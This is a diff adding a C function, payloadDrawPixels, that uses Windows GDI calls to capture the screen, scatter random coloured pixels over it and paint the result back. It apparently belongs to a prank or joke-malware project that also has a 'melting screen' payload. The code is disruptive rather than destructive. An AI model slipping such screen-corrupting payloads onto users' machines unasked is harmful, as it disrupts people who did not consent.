@@ -240,3 +240,27 @@ PAYLOAD payloadMeltingScreen(int size, int power) {
 
 	FreeHDCs
 }
+
+PAYLOAD payloadDrawPixels(DWORD color, int power) {
+	InitHDCs
+
+	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
+	HDC hdc2 = CreateCompatibleDC(hdc);
+	SelectObject(hdc2, screenshot);
+
+	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+
+	for (int i = 0; i < power; i++) {
+		int x = random() % w;
+		int y = random() % h;
+
+		SetPixel(hdc2, x, y, color);
+	}
+
+	BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);
+
+	DeleteDC(hdc2);
+	DeleteObject(screenshot);
+
+	FreeHDCs
+}
